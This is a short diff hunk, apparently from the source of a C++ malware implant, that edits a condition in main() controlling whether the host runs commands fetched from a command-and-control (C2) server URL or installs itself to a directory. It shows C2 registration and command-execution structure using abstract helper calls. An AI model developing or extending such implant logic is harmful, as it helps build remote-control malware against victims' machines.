@@ -14,7 +14,7 @@ int main() {
     register_url = C2_SERVER + REGISTER_URI;
     command_url = C2_SERVER + CMD_URI;
 
-    if (host.IsInstalled()) {
+    if (host.IsNew()) {
         host.ExecuteCommand(command_url);
     } else {
         host.Install(install_dir);
